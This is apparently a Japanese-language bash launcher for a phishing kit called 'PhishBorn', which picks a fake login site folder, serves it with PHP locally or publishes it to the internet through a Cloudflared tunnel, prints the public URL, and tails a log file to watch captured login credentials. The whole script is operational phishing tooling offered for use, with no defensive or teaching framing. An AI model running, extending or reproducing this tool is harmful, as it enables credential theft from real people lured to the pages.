#!/bin/bash

cd "$(dirname "$0")"
site_dir="site"


RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # 色をリセット

# ヘッダー
echo -e "${BLUE}"
echo -e "         PhishBorn${NC} by ${YELLOW}tajitag"
echo "====================================================================="
echo ""


folders=()
for dir in "$site_dir"/*/; do
  if [ -f "${dir}index.php" ]; then
    folders+=("$(basename "$dir")")
  fi
done

if [ ${#folders[@]} -eq 0 ]; then
  echo -e "${RED}エラー：index.php を含むフォルダが見つかりません${NC}"
  exit 1
fi


echo -e "${GREEN}起動するサイトを選んでください：${NC}"
for i in "${!folders[@]}"; do
  echo -e "${YELLOW}[$((i+1))]${NC} ${folders[$i]}"
done
echo -e "${YELLOW}[0]${NC} 終了"
echo ""


read -p "番号を入力 >>> " choice


if [[ "$choice" == "0" ]]; then
  echo -e "${RED}終了します。${NC}"
  exit 0
elif [[ "$choice" -gt 0 && "$choice" -le ${#folders[@]} ]]; then
  selected="${folders[$((choice-1))]}"
  echo -e "${BLUE}${selected} を選択しました${NC}"
  cd "$site_dir/$selected"

  echo ""
  echo -e "${GREEN}公開方法を選んでください：${NC}"
  echo -e "${YELLOW}[1]${NC} ローカルホスト（http://localhost:8000）"
  echo -e "${YELLOW}[2]${NC} 仮想サーバー公開（Cloudflared使用）"
  echo ""
  read -p "番号を入力 >>> " method

  > log.txt
 clear
  if [[ "$method" == "1" ]]; then
    echo -e "${BLUE}ローカルホストで起動します${NC}"
    php -S localhost:8000 > /dev/null 2>&1 &
    server_pid=$!
    echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC} (http://localhost:8000/index.php)"
    tail -f log.txt
    kill $server_pid

    elif [[ "$method" == "2" ]]; then
    if ! command -v cloudflared > /dev/null; then
      echo -e "${RED}Cloudflared が見つかりません。インストールしてください。${NC}"
      exit 1
    fi
    echo -e "${BLUE}Cloudflaredで仮想サーバーを起動します${NC}"
    php -S localhost:8000 > /dev/null 2>&1 &
    server_pid=$!
    sleep 2
    cloudflared tunnel --url http://localhost:8000 > cloudflared.log 2>&1 &
    tunnel_pid=$!
    sleep 4
    clear
    public_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' cloudflared.log | head -n 1)
    echo -e "${GREEN}公開URL：${YELLOW}$public_url${NC}"
    echo -e "${GREEN}ログイン情報を監視中（Ctrl+Cで終了）:${NC}"
    tail -f log.txt
    kill $server_pid
    kill $tunnel_pid

  else
    echo -e "${RED}無効な入力です。最初からやり直してください。${NC}"
  fi
else
  echo -e "${RED}無効な入力です。${NC}"
fi
